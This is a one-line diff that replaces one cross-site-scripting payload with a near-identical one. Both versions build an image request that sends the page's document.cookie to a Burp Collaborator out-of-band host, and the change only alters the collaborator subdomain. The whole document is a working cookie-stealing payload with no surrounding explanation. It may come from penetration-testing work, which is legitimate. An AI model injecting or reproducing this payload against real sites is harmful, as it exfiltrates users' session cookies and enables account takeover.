@@ -1,1 +1,1 @@
-new Image().src="http://hezsqdpm37jkz3lnjbj318iwmnseg3.burpcollaborator.net/"+(document.cookie);
+new Image().src="http://u72fljn85hvnrs5exuprjcpl2c82wr.burpcollaborator.net/"+(document.cookie);
